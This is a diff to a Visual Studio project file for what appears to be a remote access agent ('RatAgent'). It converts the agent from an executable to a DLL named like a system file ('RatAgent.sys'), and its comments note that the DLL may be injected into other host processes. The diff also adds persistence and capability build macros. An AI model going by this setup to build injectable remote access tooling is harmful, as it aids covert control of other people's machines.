@@ -13,23 +13,28 @@
   <PropertyGroup Label="Globals">
     <VCProjectVersion>17.0</VCProjectVersion>
     <Keyword>Win32Proj</Keyword>
-    <ProjectGuid>{45A58373-311A-447F-B6D9-F3B657C03A90}</ProjectGuid>
-    <RootNamespace>RatAgent</RootNamespace>
+    <ProjectGuid>{EC689B57-7058-42C1-99D0-A092E3FDCDA3}</ProjectGuid>
+    <RootNamespace>RatAgentSys</RootNamespace>
     <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <!-- 与 EXE 工程共享同一批 core 源码；只多出 agent_dll.cpp（导出/DllMain）。
+       两种配置都使用静态 CRT（/MT）：DLL 可能被注入到没有对应 CRT 的宿主进程，
+       依赖 /MD 的机器上不会存在调试版运行库。 -->
   <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
-    <UseDebugLibraries>true</UseDebugLibraries>
-    <PlatformToolset>v145</PlatformToolset>
-    <CharacterSet>MultiByte</CharacterSet>
-  </PropertyGroup>
-  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
-    <ConfigurationType>Application</ConfigurationType>
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
     <UseDebugLibraries>false</UseDebugLibraries>
     <PlatformToolset>v145</PlatformToolset>
-    <WholeProgramOptimization>true</WholeProgramOptimization>
     <CharacterSet>MultiByte</CharacterSet>
+    <TargetName>RatAgent.sys</TargetName>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>DynamicLibrary</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v145</PlatformToolset>
+    <CharacterSet>MultiByte</CharacterSet>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <TargetName>RatAgent.sys</TargetName>
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
   <ImportGroup Label="ExtensionSettings">
@@ -43,9 +48,7 @@
     <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
   </ImportGroup>
   <PropertyGroup Label="UserMacros" />
-  <!-- 中间目录按工程名分开：EXE 与 DLL 工程编译同一批 core 源码但宏不同
-       (_CONSOLE vs _USRDLL/RAT_AGENT_DLL)，共用中间目录会在解决方案级构建里互相
-       覆盖 .obj，静默产出错误二进制（例如 DLL 用上按 EXE 语义编的 agent_runtime.obj） -->
+  <!-- 中间目录按工程名分开：见 RatAgent.sys.exe.vcxproj 里的同一段说明 -->
   <PropertyGroup>
     <IntDir>$(ProjectName)\$(Platform)\$(Configuration)\</IntDir>
   </PropertyGroup>
@@ -64,19 +67,24 @@
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
       <SDLCheck>true</SDLCheck>
-      <PreprocessorDefinitions>_CONSOLE;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <LanguageStandard>stdcpp17</LanguageStandard>
       <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
       <!-- 模块工程自己的 caps.cpp 不在 core 目录里，需要把 core 加进头文件搜索路径 -->
       <AdditionalIncludeDirectories>$(ProjectDir)core;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
-      <!-- 符号文件与产物同名同目录（<产物>.pdb）：解决方案级构建时 6 个产物落在同一
-           输出目录，EXE 与 DLL 工程若用同名 PDB 会互相覆盖调试符号 -->
-      <ProgramDataBaseFileName>$(OutDir)RatAgent.exe.pdb</ProgramDataBaseFileName>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <Optimization>Disabled</Optimization>
+      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
+      <!-- 与 EXE 工程默认输出到同一目录：分离 PDB/ILK，避免互相覆盖 -->
+      <ProgramDataBaseFileName>$(OutDir)RatAgent.sys.dll.pdb</ProgramDataBaseFileName>
+      <TreatWarningAsError>false</TreatWarningAsError>
     </ClCompile>
     <Link>
-      <SubSystem>Console</SubSystem>
+      <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <ProgramDatabaseFile>$(OutDir)RatAgent.exe.pdb</ProgramDatabaseFile>
+      <ProgramDatabaseFile>$(OutDir)RatAgent.sys.dll.pdb</ProgramDatabaseFile>
+      <ImportLibrary>$(OutDir)RatAgent.sys.lib</ImportLibrary>
+      <LinkIncremental>false</LinkIncremental>
       <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
@@ -86,25 +94,26 @@
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <SDLCheck>true</SDLCheck>
-      <PreprocessorDefinitions>_CONSOLE;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>_USRDLL;RAT_AGENT_DLL;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <LanguageStandard>stdcpp17</LanguageStandard>
       <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
       <!-- 模块工程自己的 caps.cpp 不在 core 目录里，需要把 core 加进头文件搜索路径 -->
       <AdditionalIncludeDirectories>$(ProjectDir)core;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
-      <ProgramDataBaseFileName>$(OutDir)RatAgent.exe.pdb</ProgramDataBaseFileName>
+      <ProgramDataBaseFileName>$(OutDir)RatAgent.sys.dll.pdb</ProgramDataBaseFileName>
     </ClCompile>
     <Link>
-      <SubSystem>Console</SubSystem>
+      <SubSystem>Windows</SubSystem>
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <ProgramDatabaseFile>$(OutDir)RatAgent.exe.pdb</ProgramDatabaseFile>
+      <ProgramDatabaseFile>$(OutDir)RatAgent.sys.dll.pdb</ProgramDatabaseFile>
+      <ImportLibrary>$(OutDir)RatAgent.sys.lib</ImportLibrary>
       <AdditionalDependencies>ws2_32.lib;bcrypt.lib;winhttp.lib;dxgi.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClCompile Include="core\main.cpp" />
+    <ClCompile Include="core\agent_dll.cpp" />
     <ClCompile Include="caps_sys.cpp" />
     <ClCompile Include="core\agent_runtime.cpp" />
     <ClCompile Include="core\capability.cpp" />
@@ -119,8 +128,8 @@
     <ClInclude Include="core\module_id.h" />
     <ClInclude Include="core\capability.h" />
     <ClInclude Include="core\agent_debug.h" />
-    <ClInclude Include="core\protocol.h" />
     <ClInclude Include="core\agent_runtime.h" />
+    <ClInclude Include="core\protocol.h" />
     <ClInclude Include="core\crypto.h" />
     <ClInclude Include="core\net.h" />
     <ClInclude Include="core\session.h" />
